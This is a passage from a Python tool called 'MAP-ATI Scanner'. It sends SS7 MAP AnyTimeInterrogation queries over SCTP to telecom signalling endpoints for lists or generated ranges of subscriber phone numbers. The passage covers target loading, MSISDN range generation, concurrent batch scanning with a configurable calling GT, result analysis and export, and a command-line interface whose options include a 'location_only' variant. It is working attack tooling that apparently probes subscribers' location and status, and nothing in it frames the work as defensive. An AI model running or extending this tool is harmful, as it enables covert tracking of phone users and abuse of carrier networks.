            'response_preview': response[:32].hex() if len(response) > 32 else response.hex()
        })
        
        # Look for specific protocol patterns
        if b'\x30' in response:  # SEQUENCE
            result_data.additional_info['contains_sequence'] = True
        
        if b'\x04' in response:  # OCTET STRING
            result_data.additional_info['contains_octet_string'] = True
        
        # Count different byte values for entropy analysis
        byte_counts = {}
        for byte_val in response:
            byte_counts[byte_val] = byte_counts.get(byte_val, 0) + 1
        
        # Calculate simple entropy indicator
        if len(byte_counts) > 0:
            entropy = len(byte_counts) / len(response) if len(response) > 0 else 0
            result_data.additional_info['entropy_indicator'] = round(entropy, 3)
        
        logger.debug(f"[{unique_id}] Additional info extracted: {len(result_data.additional_info)} fields")
        
    except Exception as e:
        logger.error(f"[{unique_id}] Additional info extraction failed: {e}")

# ================================
# BATCH SCANNING & TARGET MANAGEMENT
# ================================

def load_targets_from_file_enhanced(file_path: str) -> List[TargetInfo]:
    """Enhanced target loading with multiple format support"""
    targets = []
    file_path = Path(file_path)
    
    if not file_path.exists():
        logger.error(f"Target file not found: {file_path}")
        return targets
    
    try:
        logger.info(f"Loading targets from {file_path}")
        
        # JSON format
        if file_path.suffix.lower() == '.json':
            with open(file_path, 'r', encoding='utf-8') as f:
                data = json.load(f)
                for item in data:
                    targets.append(TargetInfo(
                        ip=str(item['ip']),
                        port=int(item.get('port', 2905)),
                        msisdn=str(item['msisdn']),
                        description=str(item.get('description', ''))
                    ))
        
        # CSV format
        elif file_path.suffix.lower() == '.csv':
            with open(file_path, 'r', encoding='utf-8') as f:
                reader = csv.DictReader(f)
                for row_num, row in enumerate(reader, 1):
                    try:
                        targets.append(TargetInfo(
                            ip=str(row['ip']).strip(),
                            port=int(row.get('port', 2905)),
                            msisdn=str(row['msisdn']).strip(),
                            description=str(row.get('description', f'CSV line {row_num}')).strip()
                        ))
                    except (KeyError, ValueError) as e:
                        logger.warning(f"Skipping invalid CSV row {row_num}: {e}")
        
        # Plain text format (various formats supported)
        else:
            with open(file_path, 'r', encoding='utf-8') as f:
                for line_num, line in enumerate(f, 1):
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    
                    # Try different separator formats
                    separators = [':', ';', '\t', ',']
                    parsed = False
                    
                    for sep in separators:
                        parts = line.split(sep)
                        if len(parts) >= 3:
                            try:
                                targets.append(TargetInfo(
                                    ip=parts[0].strip(),
                                    port=int(parts[1].strip()),
                                    msisdn=parts[2].strip(),
                                    description=parts[3].strip() if len(parts) > 3 else f"Line {line_num}"
                                ))
                                parsed = True
                                break
                            except ValueError:
                                continue
                    
                    if not parsed:
                        logger.warning(f"Could not parse line {line_num}: {line}")
        
        logger.info(f"Successfully loaded {len(targets)} targets from {file_path}")
        
        # Validate targets
        valid_targets = []
        for target in targets:
            if validate_target(target):
                valid_targets.append(target)
            else:
                logger.warning(f"Invalid target skipped: {target}")
        
        logger.info(f"Validated {len(valid_targets)} targets")
        return valid_targets
        
    except Exception as e:
        logger.error(f"Error loading targets from {file_path}: {e}")
        return []

def validate_target(target: TargetInfo) -> bool:
    """Validate target information"""
    try:
        # Validate IP address
        ipaddress.ip_address(target.ip)
        
        # Validate port
        if not (1 <= target.port <= 65535):
            return False
        
        # Validate MSISDN (basic check)
        msisdn_digits = ''.join(c for c in target.msisdn if c.isdigit())
        if len(msisdn_digits) < 7 or len(msisdn_digits) > 15:
            return False
        
        return True
        
    except (ValueError, AttributeError):
        return False

def generate_msisdn_range_enhanced(base_msisdn: str, count: int, step: int = 1) -> List[str]:
    """Enhanced MSISDN range generation with step support"""
    msisdns = []
    
    try:
        # Extract numeric part
        base_digits = ''.join(c for c in base_msisdn if c.isdigit())
        base_num = int(base_digits)
        
        # Preserve prefix format
        prefix = base_msisdn[:len(base_msisdn) - len(base_digits)]
        
        for i in range(count):
            new_number = base_num + (i * step)
            msisdns.append(f"{prefix}{new_number}")
        
        logger.info(f"Generated {len(msisdns)} MSISDNs from {base_msisdn} with step {step}")
        
    except ValueError as e:
        logger.error(f"MSISDN range generation failed: {e}")
    
    return msisdns

def run_batch_scan_enhanced(targets: List[TargetInfo], ati_variant: AtiVariant = AtiVariant.BASIC,
                           cgpa_gt: str = "212600000001", max_workers: int = 10, 
                           timeout: int = 10, progress_callback=None) -> List[ScanResultData]:
    """Enhanced batch scanning with progress monitoring and error recovery"""
    
    results = []
    total_targets = len(targets)
    
    if total_targets == 0:
        logger.warning("No targets to scan")
        return results
    
    print_colored(f"\n🚀 Starting enhanced batch scan", Colors.BRIGHT_YELLOW, bold=True)
    print_colored(f"📊 Targets: {total_targets}, Workers: {max_workers}, Timeout: {timeout}s", Colors.CYAN)
    print_colored(f"🔧 ATI Variant: {ati_variant.value}, CGPA: {cgpa_gt}", Colors.CYAN)
    print_colored("-" * 90, Colors.CYAN)
    
    # Progress tracking
    completed = 0
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        # Submit all tasks
        future_to_target = {}
        for target in targets:
            future = executor.submit(
                send_ati_request_complete, 
                target, ati_variant, cgpa_gt, timeout
            )
            future_to_target[future] = target
        
        # Collect results as they complete
        for future in as_completed(future_to_target):
            target = future_to_target[future]
            completed += 1
            
            try:
                result = future.result()
                results.append(result)
                
                # Calculate progress and ETA
                progress = (completed / total_targets) * 100
                elapsed = time.time() - start_time
                eta = (elapsed / completed) * (total_targets - completed) if completed > 0 else 0
                
                # Determine status color
                if result.result == ScanResult.SUCCESS:
                    status_color = Colors.BRIGHT_GREEN
                    status_symbol = "✅"
                elif result.result in [ScanResult.MAP_ERROR, ScanResult.PROTOCOL_ERROR]:
                    status_color = Colors.YELLOW
                    status_symbol = "⚠️ "
                else:
                    status_color = Colors.RED
                    status_symbol = "❌"
                
                # Progress display
                print_colored(
                    f"{status_symbol} [{completed:3d}/{total_targets}] {progress:5.1f}% - "
                    f"{target.ip}:{target.port} -> {result.result.value} "
                    f"({result.response_time_ms:.0f}ms) ETA: {eta:.0f}s",
                    status_color
                )
                
                # Call progress callback if provided
                if progress_callback:
                    progress_callback(completed, total_targets, result)
                
            except Exception as e:
                logger.error(f"Error processing {target}: {e}")
                
                # Create error result
                error_result = ScanResultData(
                    target=target,
                    result=ScanResult.UNKNOWN_ERROR,
                    response_time_ms=0.0,
                    response_data=None,
                    response_hex="",
                    error_message=str(e),
                    map_error_code=None,
                    map_error_message="",
                    tcap_type="",
                    otid="",
                    invoke_id=None,
                    timestamp=datetime.now(timezone.utc).isoformat(),
                    ati_variant=ati_variant.value,
                    message_size=0,
                    additional_info={'processing_error': True}
                )
                results.append(error_result)
    
    total_time = time.time() - start_time
    print_colored("-" * 90, Colors.CYAN)
    print_colored(f"🏁 Batch scan completed in {total_time:.1f} seconds", Colors.BRIGHT_GREEN, bold=True)
    
    return results

# ================================
# RESULTS ANALYSIS & EXPORT
# ================================

def analyze_results_comprehensive(results: List[ScanResultData]) -> Dict[str, Any]:
    """Comprehensive results analysis with detailed statistics"""
    
    total = len(results)
    if total == 0:
        return {'total_scanned': 0}
    
    analysis = {
        'total_scanned': total,
        'scan_timestamp': datetime.now(timezone.utc).isoformat(),
        'scanner_version': VERSION
    }
    
    # Result type counts
    result_counts = {}
    for result_type in ScanResult:
        count = sum(1 for r in results if r.result == result_type)
        result_counts[result_type.value] = count
    analysis['result_counts'] = result_counts
    
    # Success rate calculation
    success_count = result_counts.get('success', 0)
    analysis['success_rate'] = (success_count / total) * 100 if total > 0 else 0
    
    # TCAP type distribution
    tcap_counts = {}
    for result in results:
        tcap_type = result.tcap_type or "unknown"
        tcap_counts[tcap_type] = tcap_counts.get(tcap_type, 0) + 1
    analysis['tcap_type_counts'] = tcap_counts
    
    # MAP error analysis
    map_error_counts = {}
    map_error_details = []
    for result in results:
        if result.map_error_code:
            error_key = f"{result.map_error_code}: {result.map_error_message}"
            map_error_counts[error_key] = map_error_counts.get(error_key, 0) + 1
            map_error_details.append({
                'target': str(result.target),
                'error_code': result.map_error_code,
                'error_message': result.map_error_message
            })
    analysis['map_error_counts'] = map_error_counts
    analysis['map_error_details'] = map_error_details
    
    # Response time statistics
    response_times = [r.response_time_ms for r in results if r.response_time_ms > 0]
    if response_times:
        analysis['response_time_stats'] = {
            'min': min(response_times),
            'max': max(response_times),
            'avg': sum(response_times) / len(response_times),
            'median': sorted(response_times)[len(response_times)//2],
            'count': len(response_times)
        }
    else:
        analysis['response_time_stats'] = {}
    
    # ATI variant analysis
    variant_counts = {}
    for result in results:
        variant = result.ati_variant
        variant_counts[variant] = variant_counts.get(variant, 0) + 1
    analysis['ati_variant_counts'] = variant_counts
    
    # Message size statistics
    message_sizes = [r.message_size for r in results if r.message_size > 0]
    if message_sizes:
        analysis['message_size_stats'] = {
            'min': min(message_sizes),
            'max': max(message_sizes),
            'avg': sum(message_sizes) / len(message_sizes)
        }
    
    # Top successful targets
    successful_results = [r for r in results if r.result == ScanResult.SUCCESS]
    successful_results.sort(key=lambda x: x.response_time_ms)
    analysis['top_successful_targets'] = [
        {
            'target': str(r.target),
            'response_time_ms': r.response_time_ms,
            'tcap_type': r.tcap_type
        }
        for r in successful_results[:10]
    ]
    
    # Network analysis
    target_networks = {}
    for result in results:
        try:
            network = ipaddress.ip_network(f"{result.target.ip}/24", strict=False)
            network_str = str(network)
            if network_str not in target_networks:
                target_networks[network_str] = {'total': 0, 'successful': 0}
            target_networks[network_str]['total'] += 1
            if result.result == ScanResult.SUCCESS:
                target_networks[network_str]['successful'] += 1
        except:
            pass
    
    analysis['network_analysis'] = target_networks
    
    return analysis

def export_results_enhanced(results: List[ScanResultData], output_file: str, 
                           format_type: str = "csv", include_raw_data: bool = False) -> bool:
    """Enhanced results export with multiple formats and options"""
    
    if not results:
        logger.warning("No results to export")
        return False
    
    output_path = Path(output_file)
    
    try:
        # Ensure output directory exists
        output_path.parent.mkdir(parents=True, exist_ok=True)
        
        if format_type.lower() == 'json':
            # JSON export with comprehensive data
            json_data = []
            for result in results:
                data = asdict(result)
                # Convert bytes to hex string for JSON serialization
                if data['response_data'] and include_raw_data:
                    data['response_data_hex'] = data['response_data'].hex()
                data['response_data'] = None  # Remove binary data
                json_data.append(data)
            
            with open(output_path, 'w', encoding='utf-8') as f:
                json.dump(json_data, f, indent=2, default=str, ensure_ascii=False)
        
        elif format_type.lower() == 'csv':
            # CSV export with structured data
            fieldnames = [
                'timestamp', 'target_ip', 'target_port', 'target_msisdn', 'target_description',
                'result', 'response_time_ms', 'error_message', 'map_error_code', 'map_error_message',
                'tcap_type', 'otid', 'invoke_id', 'ati_variant', 'message_size',
                'response_hex', 'additional_info_json'
            ]
            
            if include_raw_data:
                fieldnames.append('response_data_hex')
            
            with open(output_path, 'w', newline='', encoding='utf-8') as f:
                writer = csv.DictWriter(f, fieldnames=fieldnames)
                writer.writeheader()
                
                for result in results:
                    row = {
                        'timestamp': result.timestamp,
                        'target_ip': result.target.ip,
                        'target_port': result.target.port,
                        'target_msisdn': result.target.msisdn,
                        'target_description': result.target.description,
                        'result': result.result.value,
                        'response_time_ms': result.response_time_ms,
                        'error_message': result.error_message,
                        'map_error_code': result.map_error_code,
                        'map_error_message': result.map_error_message,
                        'tcap_type': result.tcap_type,
                        'otid': result.otid,
                        'invoke_id': result.invoke_id,
                        'ati_variant': result.ati_variant,
                        'message_size': result.message_size,
                        'response_hex': result.response_hex[:200] if result.response_hex else '',  # Limit hex length
                        'additional_info_json': json.dumps(result.additional_info, default=str)
                    }
                    
                    if include_raw_data and result.response_data:
                        row['response_data_hex'] = result.response_data.hex()
                    
                    writer.writerow(row)
        
        elif format_type.lower() == 'xlsx':
            # Excel export (requires openpyxl)
            try:
                import openpyxl
                from openpyxl.styles import Font, PatternFill, Alignment
                
                wb = openpyxl.Workbook()
                ws = wb.active
                ws.title = "MAP ATI Scan Results"
                
                # Headers
                headers = ['Timestamp', 'IP', 'Port', 'MSISDN', 'Result', 'Response Time (ms)', 
                          'TCAP Type', 'MAP Error', 'Error Message', 'OTID', 'ATI Variant']
                
                # Style headers
                header_font = Font(bold=True, color="FFFFFF")
                header_fill = PatternFill(start_color="366092", end_color="366092", fill_type="solid")
                
                for col, header in enumerate(headers, 1):
                    cell = ws.cell(row=1, column=col, value=header)
                    cell.font = header_font
                    cell.fill = header_fill
                    cell.alignment = Alignment(horizontal="center")
                
                # Data rows
                for row_idx, result in enumerate(results, 2):
                    ws.cell(row=row_idx, column=1, value=result.timestamp)
                    ws.cell(row=row_idx, column=2, value=result.target.ip)
                    ws.cell(row=row_idx, column=3, value=result.target.port)
                    ws.cell(row=row_idx, column=4, value=result.target.msisdn)
                    ws.cell(row=row_idx, column=5, value=result.result.value)
                    ws.cell(row=row_idx, column=6, value=result.response_time_ms)
                    ws.cell(row=row_idx, column=7, value=result.tcap_type)
                    ws.cell(row=row_idx, column=8, value=result.map_error_code)
                    ws.cell(row=row_idx, column=9, value=result.map_error_message)
                    ws.cell(row=row_idx, column=10, value=result.otid)
                    ws.cell(row=row_idx, column=11, value=result.ati_variant)
                
                # Auto-adjust column widths
                for column in ws.columns:
                    max_length = 0
                    column_letter = column[0].column_letter
                    for cell in column:
                        try:
                            if len(str(cell.value)) > max_length:
                                max_length = len(str(cell.value))
                        except:
                            pass
                    adjusted_width = min(max_length + 2, 50)
                    ws.column_dimensions[column_letter].width = adjusted_width
                
                wb.save(output_path)
                
            except ImportError:
                logger.error("openpyxl not installed. Cannot export to Excel format.")
                return False
        
        else:
            logger.error(f"Unsupported export format: {format_type}")
            return False
        
        logger.info(f"Results exported successfully to {output_path} ({format_type.upper()} format)")
        return True
        
    except Exception as e:
        logger.error(f"Error exporting results: {e}")
        return False

def print_results_summary_enhanced(results: List[ScanResultData], analysis: Dict[str, Any]):
    """Enhanced results summary with comprehensive statistics"""
    
    print_colored("\n" + "=" * 90, Colors.BRIGHT_CYAN, bold=True)
    print_colored("📊 COMPREHENSIVE SCAN RESULTS SUMMARY", Colors.BRIGHT_GREEN, bold=True)
    print_colored("=" * 90, Colors.BRIGHT_CYAN, bold=True)
    
    # Header information
    total = analysis.get('total_scanned', 0)
    success_rate = analysis.get('success_rate', 0)
    scan_time = analysis.get('scan_timestamp', 'Unknown')
    
    print_colored(f"📈 Total Targets Scanned: {total}", Colors.WHITE, bold=True)
    print_colored(f"🎯 Success Rate: {success_rate:.1f}%", 
                  Colors.BRIGHT_GREEN if success_rate > 50 else Colors.YELLOW if success_rate > 20 else Colors.RED, bold=True)
    print_colored(f"🕒 Scan Timestamp: {scan_time}", Colors.CYAN)
    print_colored(f"🔧 Scanner Version: {analysis.get('scanner_version', VERSION)}", Colors.CYAN)
    
    # Result type breakdown
    print_colored("\n📋 Results by Type:", Colors.CYAN, bold=True)
    result_counts = analysis.get('result_counts', {})
    
    result_colors = {
        'success': Colors.BRIGHT_GREEN,
        'map_error': Colors.YELLOW,
        'protocol_error': Colors.YELLOW,
        'timeout': Colors.RED,
        'connection_refused': Colors.RED,
        'network_error': Colors.RED,
        'build_error': Colors.BRIGHT_RED,
        'unknown_error': Colors.RED
    }
    
    for result_type, count in sorted(result_counts.items()):
        if count > 0:
            percentage = (count / total) * 100 if total > 0 else 0
            color = result_colors.get(result_type, Colors.WHITE)
            status_icon = "✅" if result_type == 'success' else "⚠️" if 'error' in result_type or result_type == 'timeout' else "❌"
            print_colored(f"   {status_icon} {result_type.replace('_', ' ').title():20s}: {count:4d} ({percentage:5.1f}%)", color)
    
    # TCAP type breakdown
    tcap_counts = analysis.get('tcap_type_counts', {})
    if tcap_counts:
        print_colored("\n🔧 TCAP Response Types:", Colors.CYAN, bold=True)
        for tcap_type, count in sorted(tcap_counts.items(), key=lambda x: x[1], reverse=True):
            percentage = (count / total) * 100 if total > 0 else 0
            icon = "🎯" if "End" in tcap_type else "🔄" if "Continue" in tcap_type else "🚫" if "Abort" in tcap_type else "❓"
            print_colored(f"   {icon} {tcap_type:20s}: {count:4d} ({percentage:5.1f}%)", Colors.WHITE)
    
    # MAP error breakdown
    map_errors = analysis.get('map_error_counts', {})
    if map_errors:
        print_colored("\n❌ MAP Errors:", Colors.RED, bold=True)
        for error, count in sorted(map_errors.items(), key=lambda x: x[1], reverse=True):
            print_colored(f"   🚫 {error}: {count}", Colors.RED)
    
    # Response time statistics
    time_stats = analysis.get('response_time_stats', {})
    if time_stats:
        print_colored("\n⏱️ Response Time Statistics:", Colors.CYAN, bold=True)
        print_colored(f"   📊 Minimum: {time_stats.get('min', 0):8.1f} ms", Colors.WHITE)
        print_colored(f"   📊 Maximum: {time_stats.get('max', 0):8.1f} ms", Colors.WHITE)
        print_colored(f"   📊 Average: {time_stats.get('avg', 0):8.1f} ms", Colors.WHITE)
        print_colored(f"   📊 Median:  {time_stats.get('median', 0):8.1f} ms", Colors.WHITE)
        print_colored(f"   📊 Samples: {time_stats.get('count', 0):8d}", Colors.WHITE)
    
    # ATI variant analysis
    variant_counts = analysis.get('ati_variant_counts', {})
    if variant_counts:
        print_colored("\n🎛️ ATI Variant Usage:", Colors.CYAN, bold=True)
        for variant, count in variant_counts.items():
            percentage = (count / total) * 100 if total > 0 else 0
            print_colored(f"   🔧 {variant:15s}: {count:4d} ({percentage:5.1f}%)", Colors.WHITE)
    
    # Top successful targets
    top_targets = analysis.get('top_successful_targets', [])
    if top_targets:
        print_colored(f"\n🏆 Top Successful Targets (Fastest Response):", Colors.BRIGHT_GREEN, bold=True)
        for i, target in enumerate(top_targets[:5], 1):
            print_colored(f"   {i}. {target['target']} - {target['response_time_ms']:.1f}ms ({target['tcap_type']})", Colors.GREEN)
    
    # Network analysis
    network_analysis = analysis.get('network_analysis', {})
    if network_analysis:
        print_colored("\n🌐 Network Analysis (Top Networks):", Colors.CYAN, bold=True)
        sorted_networks = sorted(network_analysis.items(), key=lambda x: x[1]['total'], reverse=True)
        for network, stats in sorted_networks[:5]:
            success_rate_net = (stats['successful'] / stats['total']) * 100 if stats['total'] > 0 else 0
            color = Colors.GREEN if success_rate_net > 50 else Colors.YELLOW if success_rate_net > 20 else Colors.RED
            print_colored(f"   📡 {network:18s}: {stats['successful']:2d}/{stats['total']:2d} ({success_rate_net:5.1f}%)", color)
    
    # Message size statistics
    msg_stats = analysis.get('message_size_stats', {})
    if msg_stats:
        print_colored("\n📦 Message Size Statistics:", Colors.CYAN, bold=True)
        print_colored(f"   📊 Minimum: {msg_stats.get('min', 0):4d} bytes", Colors.WHITE)
        print_colored(f"   📊 Maximum: {msg_stats.get('max', 0):4d} bytes", Colors.WHITE)
        print_colored(f"   📊 Average: {msg_stats.get('avg', 0):4.1f} bytes", Colors.WHITE)
    
    print_colored("=" * 90, Colors.BRIGHT_CYAN, bold=True)

# ================================
# COMMAND LINE INTERFACE
# ================================

def create_argument_parser() -> argparse.ArgumentParser:
    """Create comprehensive command line argument parser"""
    
    parser = argparse.ArgumentParser(
        description=f"MAP-ATI Scanner Official v{VERSION} - Complete Final Version",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
Examples:
  # Single target scan
  python3 {sys.argv[0]} -t 192.168.1.100:2905:+1234567890
  
  # Single target with custom variant
  python3 {sys.argv[0]} -t 192.168.1.100:2905:+1234567890 --ati-variant location_only
  
  # Batch scan from CSV file
  python3 {sys.argv[0]} -f targets.csv -o results.csv --workers 5
  
  # MSISDN range scan
  python3 {sys.argv[0]} -r 192.168.1.100:2905:+1234567890:100 --step 10
  
  # Advanced scan with all options
  python3 {sys.argv[0]} -f targets.json -o results.xlsx --format xlsx \\
    --ati-variant all_info --timeout 15 --workers 20 \\
    --log-level DEBUG --log-file scan.log
        
Target File Formats:
  CSV: ip,port,msisdn,description
  JSON: [{{"ip":"x.x.x.x","port":2905,"msisdn":"+123456","description":"test"}}]
  TXT: ip:port:msisdn:description (one per line)

Author: {AUTHOR}
Version: {VERSION}
Build: {BUILD_DATE}
        """
    )
    
    # Target specification (mutually exclusive)
    target_group = parser.add_mutually_exclusive_group(required=True)
    target_group.add_argument('-t', '--target', 
                            help='Single target: IP:PORT:MSISDN')
    target_group.add_argument('-f', '--file', 
                            help='Load targets from file (CSV/JSON/TXT)')
    target_group.add_argument('-r', '--range', 
                            help='MSISDN range: IP:PORT:BASE_MSISDN:COUNT')
    
    # ATI configuration
    parser.add_argument('--ati-variant', 
                       choices=[v.value for v in AtiVariant],
                       default=AtiVariant.BASIC.value,
                       help='ATI variant type (default: basic)')
    parser.add_argument('--cgpa-gt', 
                       default='212600000001',
                       help='Calling party GT/MSISDN (default: 212600000001)')
    
    # Range-specific options
    parser.add_argument('--step', type=int, default=1,
                       help='Step size for MSISDN range generation (default: 1)')
    
    # Scanning options
    parser.add_argument('--timeout', type=int, default=10,
                       help='Connection timeout in seconds (default: 10)')
    parser.add_argument('--workers', type=int, default=10,
                       help='Max concurrent workers (default: 10)')
    parser.add_argument('--delay', type=float, default=0.0,
                       help='Delay between requests in seconds (default: 0)')
    
    # Output options
    parser.add_argument('-o', '--output',
                       help='Output file for results')
    parser.add_argument('--format', 
                       choices=['csv', 'json', 'xlsx'],
                       default='csv',
                       help='Output format (default: csv)')
    parser.add_argument('--include-raw', action='store_true',
                       help='Include raw response data in export')
    
    # Logging options
    parser.add_argument('--log-level',
                       choices=['DEBUG', 'INFO', 'WARNING', 'ERROR'],
                       default='INFO',
                       help='Logging level (default: INFO)')
    parser.add_argument('--log-file',
                       help='Log file path')
    
    # Advanced options
    parser.add_argument('--no-banner', action='store_true',
                       help='Suppress banner display')
    parser.add_argument('--quiet', action='store_true',
                       help='Quiet mode (minimal output)')
    parser.add_argument('--stats-only', action='store_true',
                       help='Show only final statistics')
    
    return parser

def validate_arguments(args) -> bool:
    """Validate command line arguments"""
    
    # Validate workers count
    if args.workers < 1 or args.workers > 100:
        print_colored("❌ Workers count must be between 1 and 100", Colors.RED)
        return False
    
    # Validate timeout
    if args.timeout < 1 or args.timeout > 300:
        print_colored("❌ Timeout must be between 1 and 300 seconds", Colors.RED)
        return False
    
    # Validate CGPA GT
    try:
        format_msisdn_enhanced(args.cgpa_gt)
    except ValueError as e:
        print_colored(f"❌ Invalid CGPA GT: {e}", Colors.RED)
        return False
    
    # Validate single target format
    if args.target:
        parts = args.target.split(':')
        if len(parts) < 3:
            print_colored("❌ Invalid target format. Use IP:PORT:MSISDN", Colors.RED)
            return False
        
        try:
            ipaddress.ip_address(parts[0])
            port = int(parts[1])
            if not (1 <= port <= 65535):
                raise ValueError("Invalid port range")
            format_msisdn_enhanced(parts[2])
        except (ValueError, ipaddress.AddressValueError) as e:
            print_colored(f"❌ Invalid target: {e}", Colors.RED)
            return False
    
    # Validate range format
    if args.range:
        parts = args.range.split(':')
        if len(parts) < 4:
            print_colored("❌ Invalid range format. Use IP:PORT:BASE_MSISDN:COUNT", Colors.RED)
            return False
        
        try:
            ipaddress.ip_address(parts[0])
            port = int(parts[1])
            if not (1 <= port <= 65535):
                raise ValueError("Invalid port range")
            format_msisdn_enhanced(parts[2])
            count = int(parts[3])
            if count < 1 or count > 10000:
                raise ValueError("Count must be between 1 and 10000")
        except (ValueError, ipaddress.AddressValueError) as e:
            print_colored(f"❌ Invalid range: {e}", Colors.RED)
            return False
    
    # Validate file existence
    if args.file and not Path(args.file).exists():
        print_colored(f"❌ Target file not found: {args.file}", Colors.RED)
        return False
    
    return True

def main():
    """Main function with comprehensive error handling and feature support"""
    
    parser = create_argument_parser()
    args = parser.parse_args()
    
    # Suppress banner if requested
    if not args.no_banner and not args.quiet:
        print_banner()
    
    # Setup logging with appropriate level
    global logger
    log_level = 'WARNING' if args.quiet else args.log_level
    logger = setup_logging(log_level, args.log_file)
    
    # Validate arguments
    if not validate_arguments(args):
        sys.exit(1)
    
    # Check dependencies (already done during import, but double-check)
    if not PYCRATE_AVAILABLE:
        print_colored("❌ Pycrate modules not available", Colors.RED, bold=True)
        print_colored("📋 Install with: pip install pycrate pycrate-asn1rt pycrate-asn1dir pycrate-mobile", Colors.YELLOW)
        sys.exit(1)
    
    if not SCTP_AVAILABLE:
        print_colored("❌ SCTP support not available", Colors.RED, bold=True)
        print_colored("📋 Install with: pip install pysctp", Colors.YELLOW)
        sys.exit(1)
    
    if not args.quiet:
        print_colored("✅ All dependencies verified - using complete integrated method", Colors.BRIGHT_GREEN, bold=True)
    
    # Parse ATI variant
    ati_variant = AtiVariant(args.ati_variant)
    
    # Load targets based on input type
    targets = []
    
    if args.target:
        # Single target
        parts = args.target.split(':')
        targets.append(TargetInfo(
            ip=parts[0],
            port=int(parts[1]),
            msisdn=parts[2],
            description="Single target scan"
        ))
    
    elif args.file:
        # Load from file
        targets = load_targets_from_file_enhanced(args.file)
        if not targets:
            print_colored("❌ No valid targets loaded from file", Colors.RED)
            sys.exit(1)
    
    elif args.range:
        # MSISDN range
        parts = args.range.split(':')
        ip, port, base_msisdn, count = parts[0], int(parts[1]), parts[2], int(parts[3])
        msisdns = generate_msisdn_range_enhanced(base_msisdn, count, args.step)
        
        for msisdn in msisdns:
            targets.append(TargetInfo(
                ip=ip,
                port=port,
                msisdn=msisdn,
                description=f"Range scan #{len(targets)+1}"
            ))
    
    if not targets:
        print_colored("❌ No targets specified", Colors.RED)
        sys.exit(1)
    
    # Display scan configuration
    if not args.quiet:
        print_colored(f"\n🎯 Scan Configuration:", Colors.CYAN, bold=True)
        print_colored(f"   📊 Targets: {len(targets)}", Colors.WHITE)
        print_colored(f"   🔧 ATI Variant: {ati_variant.value}", Colors.WHITE)
        print_colored(f"   📞 CGPA GT: {args.cgpa_gt}", Colors.WHITE)
        print_colored(f"   ⏱️  Timeout: {args.timeout}s", Colors.WHITE)
        print_colored(f"   👥 Workers: {args.workers}", Colors.WHITE)
        if args.delay > 0:
            print_colored(f"   ⏸️  Delay: {args.delay}s", Colors.WHITE)
        if args.output:
            print_colored(f"   📁 Output: {args.output} ({args.format.upper()})", Colors.WHITE)
        print_colored("-" * 90, Colors.CYAN)
    
    # Run scan with progress monitoring
    print_colored("🚀 Starting MAP-ATI scan with complete verified method...", Colors.BRIGHT_YELLOW, bold=True)
    
    start_time = time.time()
    
    # Progress callback for real-time updates
    def progress_callback(completed, total, result):
        if not args.quiet and not args.stats_only:
            # Additional real-time statistics could be displayed here
            pass
    
    results = run_batch_scan_enhanced(
        targets, ati_variant, args.cgpa_gt, 
        args.workers, args.timeout, progress_callback
    )
    
    scan_duration = time.time() - start_time
    
    # Analyze results
    analysis = analyze_results_comprehensive(results)
    
    # Display results summary
    if not args.quiet:
        print_results_summary_enhanced(results, analysis)
        print_colored(f"\n⏱️ Total scan duration: {scan_duration:.1f} seconds", Colors.CYAN, bold=True)
        
        # Calculate scan rate
        scan_rate = len(targets) / scan_duration if scan_duration > 0 else 0
        print_colored(f"📈 Scan rate: {scan_rate:.1f} targets/second", Colors.CYAN, bold=True)
    
    # Export results if requested
    if args.output:
        success = export_results_enhanced(results, args.output, args.format, args.include_raw)
        if success:
            print_colored(f"📁 Results exported to {args.output}", Colors.GREEN, bold=True)
        else:
            print_colored(f"❌ Failed to export results", Colors.RED, bold=True)
    
    # Final status
    success_count = analysis.get('result_counts', {}).get('success', 0)
    if success_count > 0:
        print_colored(f"\n🎉 Scan completed successfully! {success_count}/{len(targets)} successful responses", 
                      Colors.BRIGHT_GREEN, bold=True)
        exit_code = 0
    else:
        print_colored(f"\n⚠️ Scan completed with no successful responses", 
                      Colors.YELLOW, bold=True)
        exit_code = 1
    
    # Display quick usage tip
    if not args.quiet and not args.output:
        print_colored(f"💡 Tip: Use -o results.csv to save detailed results", Colors.CYAN)
    
    sys.exit(exit_code)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print_colored("\n🛑 Scan interrupted by user", Colors.YELLOW, bold=True)
        sys.exit(130)
    except Exception as e:
        logger.error(f"Unexpected error: {e}")
        print_colored(f"\n❌ Unexpected error: {e}", Colors.RED, bold=True)
        if logger.level == logging.DEBUG:
            import traceback
            print_colored(traceback.format_exc(), Colors.RED)
        sys.exit(1)
